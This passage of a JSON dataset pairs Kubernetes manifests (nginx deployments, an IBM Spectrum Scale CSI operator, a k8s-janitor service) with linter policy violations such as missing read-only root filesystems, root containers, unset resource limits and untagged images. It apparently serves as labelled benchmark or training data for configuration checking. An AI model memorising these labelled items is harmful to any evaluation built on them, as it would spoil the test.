    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8205",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8206",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "8207",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "8208",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "8209",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "8210",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "8211",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "8212",
    "manifest_path": "data/manifests/the_stack_sample/sample_3045.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: voting-app-pod\n  labels:\n    name: voting-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: voting-app\n    image: kodekloud/examplevotingapp_vote:v1\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"voting-app\" does not have a read-only root file system"
  },
  {
    "id": "8213",
    "manifest_path": "data/manifests/the_stack_sample/sample_3045.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: voting-app-pod\n  labels:\n    name: voting-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: voting-app\n    image: kodekloud/examplevotingapp_vote:v1\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"voting-app\" is not set to runAsNonRoot"
  },
  {
    "id": "8214",
    "manifest_path": "data/manifests/the_stack_sample/sample_3045.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: voting-app-pod\n  labels:\n    name: voting-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: voting-app\n    image: kodekloud/examplevotingapp_vote:v1\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"voting-app\" has cpu request 0"
  },
  {
    "id": "8215",
    "manifest_path": "data/manifests/the_stack_sample/sample_3045.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: voting-app-pod\n  labels:\n    name: voting-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: voting-app\n    image: kodekloud/examplevotingapp_vote:v1\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"voting-app\" has memory limit 0"
  },
  {
    "id": "8216",
    "manifest_path": "data/manifests/the_stack_sample/sample_3048.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.18.0\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8217",
    "manifest_path": "data/manifests/the_stack_sample/sample_3048.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.18.0\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8218",
    "manifest_path": "data/manifests/the_stack_sample/sample_3048.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.18.0\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8219",
    "manifest_path": "data/manifests/the_stack_sample/sample_3048.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.18.0\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8220",
    "manifest_path": "data/manifests/the_stack_sample/sample_3048.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.18.0\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8221",
    "manifest_path": "data/manifests/the_stack_sample/sample_3049.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: ibm-spectrum-scale-csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.3.1\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-driver:v2.3.1\n        image: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-operator:v2.3.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MAX_CONCURRENT_RECONCILES_SECRET_ in container \"operator\" found"
  },
  {
    "id": "8222",
    "manifest_path": "data/manifests/the_stack_sample/sample_3049.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: ibm-spectrum-scale-csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.3.1\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-driver:v2.3.1\n        image: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-operator:v2.3.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"operator\" does not have a read-only root file system"
  },
  {
    "id": "8223",
    "manifest_path": "data/manifests/the_stack_sample/sample_3049.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: ibm-spectrum-scale-csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.3.1\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-driver:v2.3.1\n        image: quay.io/ibm-spectrum-scale/ibm-spectrum-scale-csi-operator:v2.3.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ibm-spectrum-scale-csi-operator\" not found"
  },
  {
    "id": "8224",
    "manifest_path": "data/manifests/the_stack_sample/sample_3051.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: app-metrics-operator\n  name: app-metrics-operator\nspec:\n  ports:\n  - name: metrics\n    port: 8383\n    protocol: TCP\n    targetPort: 8383\n  selector:\n    name: app-metrics-operator\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:app-metrics-operator])"
  },
  {
    "id": "8225",
    "manifest_path": "data/manifests/the_stack_sample/sample_3053.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: svc-1\nspec:\n  selector:\n    app: pod\n  ports:\n  - port: 9000\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pod])"
  },
  {
    "id": "8226",
    "manifest_path": "data/manifests/the_stack_sample/sample_3055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-janitor\n  namespace: $(kubernetes-namespace)\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-janitor\n  template:\n    metadata:\n      labels:\n        app: k8s-janitor\n      annotations:\n        iam.amazonaws.com/role: eks-hellman-self-service\n        prometheus.io/port: '8080'\n        prometheus.io/scrape: 'true'\n        logging_dfds_cloud_format_json: 'true'\n    spec:\n      serviceAccountName: k8s-janitor-sa\n      containers:\n      - name: k8s-janitor\n        image: 579478677147.dkr.ecr.eu-central-1.amazonaws.com/ded/k8s-janitor:$(Build.BuildId)\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 8080\n          name: metrics\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 100m\n          limits:\n            memory: 400Mi\n            cpu: 200m\n        livenessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        readinessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        env:\n        - name: AWS_S3_BUCKET_REGION\n          value: $(AWS_S3_BUCKET_REGION)\n        - name: AWS_S3_BUCKET_NAME_CONFIG_MAP\n          value: $(AWS_S3_BUCKET_NAME_CONFIG_MAP)\n        - name: CONFIG_MAP_FILE_NAME\n          value: $(CONFIG_MAP_FILE_NAME)\n        - name: KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS\n          value: $(KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS)\n        - name: KUBERNETES_SERVICE_KAFKA_BROKER_VERSION_FALLBACK\n          value: 0.10.0.0\n        - name: KUBERNETES_SERVICE_KAFKA_API_VERSION_FALLBACK_MS\n          value: '0'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: username\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: password\n        - name: KUBERNETES_SERVICE_KAFKA_GROUP_ID\n          value: $(KUBERNETES_SERVICE_KAFKA_GROUP_ID)\n        - name: KUBERNETES_SERVICE_KAFKA_ENABLE_AUTO_COMMIT\n          value: 'false'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_MECHANISMS\n          value: PLAIN\n        - name: KUBERNETES_SERVICE_KAFKA_SECURITY_PROTOCOL\n          value: SASL_SSL\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"k8s-janitor\" does not have a read-only root file system"
  },
  {
    "id": "8227",
    "manifest_path": "data/manifests/the_stack_sample/sample_3055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-janitor\n  namespace: $(kubernetes-namespace)\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-janitor\n  template:\n    metadata:\n      labels:\n        app: k8s-janitor\n      annotations:\n        iam.amazonaws.com/role: eks-hellman-self-service\n        prometheus.io/port: '8080'\n        prometheus.io/scrape: 'true'\n        logging_dfds_cloud_format_json: 'true'\n    spec:\n      serviceAccountName: k8s-janitor-sa\n      containers:\n      - name: k8s-janitor\n        image: 579478677147.dkr.ecr.eu-central-1.amazonaws.com/ded/k8s-janitor:$(Build.BuildId)\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 8080\n          name: metrics\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 100m\n          limits:\n            memory: 400Mi\n            cpu: 200m\n        livenessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        readinessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        env:\n        - name: AWS_S3_BUCKET_REGION\n          value: $(AWS_S3_BUCKET_REGION)\n        - name: AWS_S3_BUCKET_NAME_CONFIG_MAP\n          value: $(AWS_S3_BUCKET_NAME_CONFIG_MAP)\n        - name: CONFIG_MAP_FILE_NAME\n          value: $(CONFIG_MAP_FILE_NAME)\n        - name: KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS\n          value: $(KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS)\n        - name: KUBERNETES_SERVICE_KAFKA_BROKER_VERSION_FALLBACK\n          value: 0.10.0.0\n        - name: KUBERNETES_SERVICE_KAFKA_API_VERSION_FALLBACK_MS\n          value: '0'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: username\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: password\n        - name: KUBERNETES_SERVICE_KAFKA_GROUP_ID\n          value: $(KUBERNETES_SERVICE_KAFKA_GROUP_ID)\n        - name: KUBERNETES_SERVICE_KAFKA_ENABLE_AUTO_COMMIT\n          value: 'false'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_MECHANISMS\n          value: PLAIN\n        - name: KUBERNETES_SERVICE_KAFKA_SECURITY_PROTOCOL\n          value: SASL_SSL\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"k8s-janitor-sa\" not found"
  },
  {
    "id": "8228",
    "manifest_path": "data/manifests/the_stack_sample/sample_3055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-janitor\n  namespace: $(kubernetes-namespace)\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-janitor\n  template:\n    metadata:\n      labels:\n        app: k8s-janitor\n      annotations:\n        iam.amazonaws.com/role: eks-hellman-self-service\n        prometheus.io/port: '8080'\n        prometheus.io/scrape: 'true'\n        logging_dfds_cloud_format_json: 'true'\n    spec:\n      serviceAccountName: k8s-janitor-sa\n      containers:\n      - name: k8s-janitor\n        image: 579478677147.dkr.ecr.eu-central-1.amazonaws.com/ded/k8s-janitor:$(Build.BuildId)\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 8080\n          name: metrics\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 100m\n          limits:\n            memory: 400Mi\n            cpu: 200m\n        livenessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        readinessProbe:\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n          httpGet:\n            port: web\n            path: /healthz\n        env:\n        - name: AWS_S3_BUCKET_REGION\n          value: $(AWS_S3_BUCKET_REGION)\n        - name: AWS_S3_BUCKET_NAME_CONFIG_MAP\n          value: $(AWS_S3_BUCKET_NAME_CONFIG_MAP)\n        - name: CONFIG_MAP_FILE_NAME\n          value: $(CONFIG_MAP_FILE_NAME)\n        - name: KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS\n          value: $(KUBERNETES_SERVICE_KAFKA_BOOTSTRAP_SERVERS)\n        - name: KUBERNETES_SERVICE_KAFKA_BROKER_VERSION_FALLBACK\n          value: 0.10.0.0\n        - name: KUBERNETES_SERVICE_KAFKA_API_VERSION_FALLBACK_MS\n          value: '0'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: username\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: k8s-janitor-kafka-credentials\n              key: password\n        - name: KUBERNETES_SERVICE_KAFKA_GROUP_ID\n          value: $(KUBERNETES_SERVICE_KAFKA_GROUP_ID)\n        - name: KUBERNETES_SERVICE_KAFKA_ENABLE_AUTO_COMMIT\n          value: 'false'\n        - name: KUBERNETES_SERVICE_KAFKA_SASL_MECHANISMS\n          value: PLAIN\n        - name: KUBERNETES_SERVICE_KAFKA_SECURITY_PROTOCOL\n          value: SASL_SSL\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"k8s-janitor\" is not set to runAsNonRoot"
  },
  {
    "id": "8229",
    "manifest_path": "data/manifests/the_stack_sample/sample_3056.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6119\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8230",
    "manifest_path": "data/manifests/the_stack_sample/sample_3056.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6119\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8231",
    "manifest_path": "data/manifests/the_stack_sample/sample_3056.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6119\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8232",
    "manifest_path": "data/manifests/the_stack_sample/sample_3056.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6119\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8233",
    "manifest_path": "data/manifests/the_stack_sample/sample_3056.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6119\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8234",
    "manifest_path": "data/manifests/the_stack_sample/sample_3057.yaml",
